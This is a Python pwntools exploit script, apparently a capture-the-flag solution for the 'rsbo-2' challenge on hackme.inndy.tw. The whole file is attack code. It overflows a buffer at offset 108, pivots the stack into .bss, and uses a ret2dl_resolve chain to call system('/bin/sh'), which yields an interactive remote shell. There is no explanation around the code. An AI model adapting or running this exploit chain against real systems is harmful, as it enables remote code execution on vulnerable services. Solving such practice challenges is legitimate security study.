from pwn import *
import roputils

context.log_level = 'debug'

conn = remote('hackme.inndy.tw', 7706)

elf = ELF('./rsbo-2')
rop = roputils.ROP('./rsbo-2')

offset = 108
bss_addr = elf.bss()
base_stage = bss_addr + 0x800

pop_ebp = 0x0804879f
leave_ret = 0x080484f8
pop3_ret  = 0x0804879d
main_addr = 0x0840867f
read_plt =  elf.plt['read']
read_80b = 0x0804865c

payload = '\x00' * offset + p32(read_80b) + p32(pop_ebp) + p32(bss_addr + 0x400) + p32(leave_ret)
conn.send(payload)

payload = 'a' * 4 + p32(read_plt) + p32(pop3_ret) + p32(0) + p32(base_stage) + p32(100)
payload += rop.dl_resolve_call(base_stage + 20, base_stage)
payload += rop.fill(0x7f, payload)
conn.sendline(payload)

buf = '/bin/sh\x00'

buf += rop.fill(20,buf)
buf += rop.dl_resolve_data(base_stage + 20, 'system')
buf += rop.fill(100,buf)

conn.send(buf)

conn.interactive()